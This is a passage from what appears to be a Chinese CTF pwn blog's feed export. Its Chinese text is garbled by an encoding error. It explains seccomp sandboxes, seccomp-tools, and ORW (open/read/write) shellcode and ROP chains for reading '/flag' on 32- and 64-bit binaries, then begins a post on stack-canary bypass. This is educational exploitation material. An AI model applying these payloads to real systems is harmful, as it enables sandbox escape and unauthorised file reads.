class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">60LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">231LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// seccomp_load -> å°†å½“å‰ seccomp è¿‡æ»¤å™¨åŠ è½½åˆ°å†…æ ¸ä¸­</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// seccomp_release -> é‡Šæ”¾ seccomp è¿‡æ»¤å™¨çŠ¶æ€</span>    <span class="token comment">// ä½†å¯¹å·²ç» load çš„è¿‡æ»¤è§„åˆ™ä¸å½±å“</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"seccomp error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">seccomp_release</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="æ²™ç®±ä¿æŠ¤çš„è¯†åˆ«"><a href="#æ²™ç®±ä¿æŠ¤çš„è¯†åˆ«" class="headerlink" title="æ²™ç®±ä¿æŠ¤çš„è¯†åˆ«"></a>æ²™ç®±ä¿æŠ¤çš„è¯†åˆ«</h2><p>ä½¿ç”¨å·¥å…· <code>seccomp-tools</code> å¯ä»¥è¯†åˆ«äºŒè¿›åˆ¶ç¨‹åºæ˜¯å¦å¼€å¯äº†æ²™ç®±ï¼Œå¹¶ä¸”ç¦æ­¢äº†å“ªäº›ç³»ç»Ÿè°ƒç”¨</p><p>å®‰è£… <code>seccomp-tools</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc ruby-devgem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">seccomp-tools dump äºŒè¿›åˆ¶ç¨‹åº<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW3.png" alt="æ²™ç®±ç»•è¿‡ä¸ORW3.png"></p><p>é‡ç‚¹æ³¨æ„æœ€åçš„ä¸¤å¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0004: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL0005: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é€šè¿‡ <code>goto</code> è·³è½¬çš„åœ°å€å¯ä»¥åˆ¤æ–­å“ªäº›ç³»ç»Ÿè°ƒç”¨æ˜¯è¢«ç¦æ­¢çš„ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯ç¦ç”¨äº† <code>execve</code></p><hr><h1 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h1><blockquote><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ <code>open</code>ã€<code>read</code>ã€<code>write</code>ï¼šæ‰“å¼€æ–‡ä»¶ï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å–å­˜å‚¨åˆ°æŸä¸ªä½ç½®ï¼Œå°†æ–‡ä»¶å†…å®¹æ‰“å°å‡ºæ¥</p><p><mark>è¿™ç§æ–¹æ³•ä¸èƒ½è·å– shellï¼Œä½†å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å’Œä»»æ„åœ°å€å†™</mark></p><p><strong>ç”±äº <code>open()</code> å‡½æ•°æ‰“å¼€æ–‡ä»¶éœ€è¦ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶åï¼Œå› æ­¤æˆ‘ä»¬å¯èƒ½éœ€è¦å…ˆåœ¨æŸä¸ªåœ°å€å¤„å†™å…¥æ–‡ä»¶å <code>b&#39;/flag\x00&#39;</code>ï¼Œç„¶åå°†å…¶åœ°å€ä½œä¸ºå‚æ•°ä¼ ç»™ <code>open()</code> å‡½æ•°</strong></p></blockquote><ul><li>32 ä½ ORW ç³»ç»Ÿè°ƒç”¨å·ï¼š</li></ul><table><thead><tr><th align="left">eax</th><th align="left">system call</th><th align="left">ebx</th><th align="left">ecx</th><th align="left">edx</th><th></th></tr></thead><tbody><tr><td align="left">3</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td></td></tr><tr><td align="left">4</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td></td></tr><tr><td align="left">5</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td></td></tr></tbody></table><p>å…¶å®ƒç±»ä¼¼åŠŸèƒ½çš„å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š<code>fopen()</code>ã€<code>fwrite()</code>ï¼Œå…·ä½“æ ¹æ®å‡½æ•°çš„ä¼ å‚è°ƒæ•´å¯„å­˜å™¨å³å¯</p><p>æ›´å¤š 32 ä½ syscall æ ¼å¼è§ï¼š<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_32.tbl">linux&#x2F;syscall_32.tbl Â· torvalds&#x2F;linux Â· GitHub</a></p><ul><li>64 ä½ ORW ç³»ç»Ÿè°ƒç”¨å·ï¼š</li></ul><table><thead><tr><th align="left">rax</th><th align="left">system call</th><th align="left">rdi</th><th align="left">rsi</th><th align="left">rdx</th></tr></thead><tbody><tr><td align="left">0</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">1</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">2</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td></tr></tbody></table><p>å…¶å®ƒç±»ä¼¼åŠŸèƒ½çš„å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š<code>fopen()</code>ã€<code>fwrite()</code>ã€<code>open64()</code>ï¼Œå…·ä½“æ ¹æ®å‡½æ•°çš„ä¼ å‚è°ƒæ•´å¯„å­˜å™¨å³å¯</p><p>æ›´å¤š 64 ä½ syscall æ ¼å¼è§ï¼š<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">linux&#x2F;syscall_64.tbl Â· torvalds&#x2F;linux Â· GitHub</a></p><hr><h2 id="Shellcode-å‹"><a href="#Shellcode-å‹" class="headerlink" title="Shellcode å‹"></a>Shellcode å‹</h2><blockquote><p><strong>é€‚ç”¨äºç¨‹åºæ²¡æœ‰ NX ä¿æŠ¤çš„æ—¶å€™</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†æŒ‡ä»¤å†™åˆ°æ ˆä¸Šå¹¶æ‰§è¡Œ</p><p>ä¸è¿‡ç°åœ¨ç¨‹åºä¸å¼€ NX ä¿æŠ¤çš„æƒ…å†µå‡ ä¹å¾ˆå°‘äº†ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•äº†è§£ä¸€ä¸‹å°±å¥½</p></blockquote><h3 id="32-ä½-ORW-æ„é€ "><a href="#32-ä½-ORW-æ„é€ " class="headerlink" title="32 ä½ ORW æ„é€ "></a>32 ä½ ORW æ„é€ </h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = open('/flag', 0) </span>ORW <span class="token operator">=</span> <span class="token triple-quoted-string string">''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''</span><span class="token comment"># read(fd, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov edx,0x50; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''</span><span class="token comment"># write(1, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov edx,0x50; mov ebx,1; mov eax,4; int 0x80; '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå¯¹æ±‡ç¼–è¯­è¨€ä¸ç†Ÿæ‚‰ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ Pwntools çš„ <code>shellcraft</code> æ¨¡å—ç”Ÿæˆï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å£°æ˜ç¨‹åºæ¶æ„ä¸º 32 ä½</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># æ‰“å¼€æœ¬åœ°çš„flagæ–‡ä»¶</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ–‡ä»¶æè¿°ç¬¦3ï¼šå…¶å®ƒæ‰“å¼€çš„æ–‡ä»¶ï¼Œå°† flag å†…å®¹å†™å…¥åˆ° data_address åœ°å€å¤„</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ–‡ä»¶æè¿°ç¬¦1ï¼šè¾“å‡ºåˆ°å±å¹•ï¼Œæ‰“å°åœ°å€ data_address å¤„å­˜å‚¨çš„ flag å†…å®¹</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-ä½-ORW-æ„é€ "><a href="#64-ä½-ORW-æ„é€ " class="headerlink" title="64 ä½ ORW æ„é€ "></a>64 ä½ ORW æ„é€ </h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = open('/flag', 0) </span>ORW <span class="token operator">=</span> <span class="token triple-quoted-string string">''' xor rdx,rdx; mov rsi,0; mov rdi,0x804a094; mov rax,2; syscall; '''</span><span class="token comment"># read(fd, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov rdx,0x50; mov rsi,rdi; mov rdi,rax; mov rax,0; syscall; '''</span><span class="token comment"># write(1, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov rdx,0x50; mov rdi,1; mov rax,1; syscall; '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå¯¹æ±‡ç¼–è¯­è¨€ä¸ç†Ÿæ‚‰ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ Pwntools çš„ <code>shellcraft</code> æ¨¡å—ç”Ÿæˆï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å£°æ˜ç¨‹åºæ¶æ„ä¸º 64 ä½</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># æ‰“å¼€æœ¬åœ°çš„flagæ–‡ä»¶</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ–‡ä»¶æè¿°ç¬¦3ï¼šå…¶å®ƒæ‰“å¼€çš„æ–‡ä»¶ï¼Œå°† flag å†…å®¹å†™å…¥åˆ° data_address åœ°å€å¤„</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ–‡ä»¶æè¿°ç¬¦1ï¼šè¾“å‡ºåˆ°å±å¹•ï¼Œæ‰“å°åœ°å€ data_address å¤„å­˜å‚¨çš„ flag å†…å®¹</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ROP-å‹"><a href="#ROP-å‹" class="headerlink" title="ROP å‹"></a>ROP å‹</h2><blockquote><p>å¦‚æœç¨‹åºå¼€å¯äº† NX ä¿æŠ¤ï¼Œé‚£ä¹ˆ Shellcode å‹ ORW å°±å¤±æ•ˆäº†</p><p>å› æ­¤ï¼Œ<strong>ç›¸å¯¹æ¥è¯´ï¼Œè¿™ç§ ROP çš„æ–¹å¼å®ç”¨æ€§æ›´å¹¿ä¸€äº›</strong></p></blockquote><h3 id="32-ä½-ORW-æ„é€ -1"><a href="#32-ä½-ORW-æ„é€ -1" class="headerlink" title="32 ä½ ORW æ„é€ "></a>32 ä½ ORW æ„é€ </h3><blockquote><p>æ³¨æ„ï¼š32 ä½ç¨‹åºåœ¨ä¼ å‚æ—¶æ ˆä¸Šä¼šå¤šå‡ºä¸€ä¸ªè¿”å›åœ°å€ <code>back_addr</code></p><p><em>æˆ‘ä»¬å¯ä»¥å°† <code>back_addr</code> è®¾ç½®ä¸ºè®©æˆ‘ä»¬è¾“å…¥æ„é€  ROP çš„åœ°æ–¹ï¼Œè¿™æ ·å°±å¯ä»¥è¿ç»­è¾“å…¥ 3 æ¬¡ï¼Œå°† ORW è¿ç»­ 3 æ¬¡åˆ†åˆ«å†™å…¥å¹¶æ‰§è¡Œ</em></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = fopen('/flag', 'r') </span>ORW1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>fopen_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>back_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_addr<span class="token punctuation">)</span><span class="token comment"># read(3, write_flag_addr, 0x50)</span>ORW2 <span class="token operator">=</span> p32<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>back_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token comment"># write(1, write_flag_addr, 0x50)</span>ORW3 <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-ä½-ORW-æ„é€ -1"><a href="#64-ä½-ORW-æ„é€ -1" class="headerlink" title="64 ä½ ORW æ„é€ "></a>64 ä½ ORW æ„é€ </h3><blockquote><p>æ³¨æ„ï¼š64 ä½ç¨‹åºä¼ å‚éœ€è¦å€ŸåŠ©å¯„å­˜å™¨</p><p><em>å› æ­¤ç¨‹åºä¸­å…·ä½“å­˜åœ¨ä»€ä¹ˆæ ·çš„ gadget éœ€è¦å…·ä½“åˆ†æï¼ŒORW æ„é€ ä¹Ÿä¼šç›¸åº”åœ°ä¿®æ”¹ï¼Œä½†åªè¦ä¿è¯æˆ‘ä»¬èƒ½å¤Ÿå°†å¯¹åº”çš„å€¼ä¼ å…¥å¯¹åº”çš„å¯„å­˜å™¨ä¸­å³å¯</em></p><p><strong>å¦‚æœæ²¡æœ‰åˆé€‚çš„ gadget åˆ©ç”¨ï¼Œå¯ä»¥å°è¯• Ret2csu</strong></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># open(b'/flag\x00\x00', 0)</span>ORW <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open64_plt_addr<span class="token punctuation">)</span><span class="token comment"># read(3, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span><span class="token comment"># write(1, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_plt_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">æ²™ç®±æŠ€æœ¯æ˜¯ä¸€ç§ä¸ºæ‰§è¡Œä¸­çš„ç¨‹åºæä¾›éš”ç¦»ç¯å¢ƒçš„å®‰å…¨æœºåˆ¶ï¼Œä½†ä¸è™šæ‹Ÿæœºæœ‰æ‰€åŒºåˆ«ï¼Œåœ¨æ²™ç®±ç¯å¢ƒä¸‹é€šå¸¸ä¼šé™åˆ¶ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œè™½ç„¶ ORW æ— æ³•è·å– shellï¼Œä½†å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å’Œä»»æ„åœ°å€å†™</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="ORW" scheme="https://www.uf4te.cn/tags/ORW/"/>
    
    <category term="æ²™ç®±ç»•è¿‡" scheme="https://www.uf4te.cn/tags/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>Bypasså®‰å…¨æœºåˆ¶</title>
    <link href="https://www.uf4te.cn/posts/c695aa69.html"/>
    <id>https://www.uf4te.cn/posts/c695aa69.html</id>
    <published>2024-05-12T02:05:35.000Z</published>
    <updated>2024-06-05T06:37:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Canary-Bypass"><a href="#Canary-Bypass" class="headerlink" title="Canary Bypass"></a>Canary Bypass</h1><blockquote><p>æœ¬èŠ‚ä¸»è¦æ±‡æ€»äº†å¸¸ç”¨çš„ç»•è¿‡ Canary çš„æ–¹æ³•</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/262846#h2-16">ç»•è¿‡canaryä¿æŠ¤çš„6ç§æ–¹æ³•-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p></blockquote><hr><h2 id="ä»€ä¹ˆæ˜¯-Canaryï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Canaryï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Canaryï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Canaryï¼Ÿ</h2><blockquote><p>Canary åˆå«é‡‘ä¸é›€ï¼Œæ˜¯ä¸€ç§é’ˆå¯¹æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶ï¼Œå®ƒåœ¨ç¨‹åºçš„å‡½æ•°å…¥å£å¤„ä» GS æ®µï¼ˆ32 ä½ï¼‰æˆ– FS æ®µï¼ˆ64 ä½ï¼‰å†…è·å–ä¸€ä¸ªéšæœºå€¼ï¼Œ<strong>æ¯æ¬¡è¿›ç¨‹é‡å¯çš„ Canary éƒ½ä¸åŒï¼Œä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„</strong></p><p>å¦‚æœæˆ‘ä»¬æƒ³åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–è¿”å›å€¼ï¼Œåˆ™å¡«å……çš„æ•°æ®å¿…å®šä¼šç»è¿‡æ ˆä¸Šçš„ Canaryï¼Œå¦‚æœç¨‹åºæ£€æµ‹åˆ° Canary çš„å€¼è¢«ä¿®æ”¹ï¼Œç¨‹åºä¾¿ä¼šæ‰§è¡Œ <code>__stack_chk_fail</code> å‡½æ•°ï¼Œå¯¼è‡´ç¨‹åºå‘ç”Ÿå´©æºƒï¼Œæˆ‘ä»¬ä¹Ÿå°±æ— æ³•åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´äº†</p><p>è§¦å‘ Canary ä¿æŠ¤æ—¶ï¼Œç¨‹åºä¼šè¾“å‡ºï¼š<code>*** stack smashing detected ***: terminated</code></p><p>æ³¨æ„ï¼š<mark>å­è¿›ç¨‹ç”±äºè§¦å‘ Canary å´©æºƒä¸ä¼šå¯¼è‡´çˆ¶è¿›ç¨‹é€€å‡º</mark>ï¼Œè¿™ä¸ºæˆ‘ä»¬ Bypass Canary æä¾›äº†æ›´å¤šçš„å¯èƒ½</p></blockquote><p>GCC ç¼–è¯‘æ—¶è®¾ç½® Canary ä¿æŠ¤çš„å‚æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-fstack-protector   <span class="token comment"># å¯ç”¨ä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤</span>-fstack-protector-all   <span class="token comment"># å¯ç”¨ä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤</span>-fstack-protector-strong-fstack-protector-explicit   <span class="token comment"># åªå¯¹æœ‰æ˜ç¡® stack_protect attribute çš„å‡½æ•°å¼€å¯ä¿æŠ¤</span>-fno-stack-protector   <span class="token comment"># ç¦ç”¨ä¿æŠ¤</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ IDA ä¸­ï¼ŒCanary ä¸€èˆ¬ä»¥å¦‚ä¸‹å½¢å¼å‡ºç°ï¼š</p><ul><li>64 ä½ç¨‹åº</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B613.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶13.png"></p><ul><li>32 ä½ç¨‹åº</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B614.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶14.png"></p><p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œé€šå¸¸ Canary åœ¨æ ˆä¸­æ˜¯ä½äº RBP ä¸Šæ–¹çš„ 8 å­—èŠ‚ï¼ˆä¸ RBP ç›¸é‚»ï¼‰ï¼Œ<strong>ä½†æ˜¯ Canary çš„ä½ç½®ä¸ä¸€å®šæ€»æ˜¯ä¸ RBP ç›¸é‚»ï¼Œå…·ä½“å¾—çœ‹ç¼–è¯‘å™¨çš„æ“ä½œ</strong></p><p>ä»¥ä¸€ä¸ª 64 ä½ç¨‹åºçš„ä¾‹å­æ¥è¯´æ˜ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B61.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶1.png"></p><p>å¯ä»¥çœ‹åˆ° <code>v2</code> ä½äº <code>rbp - 8h</code> çš„åœ°æ–¹ï¼Œæ­£å¥½åœ¨ RBP ä¸Šæ–¹çš„ 8 å­—èŠ‚ï¼ˆä¸ RBP ç›¸é‚»ï¼‰</p><p>åœ¨æ ˆä¸­çš„æ ·å­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B62.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B65.png" 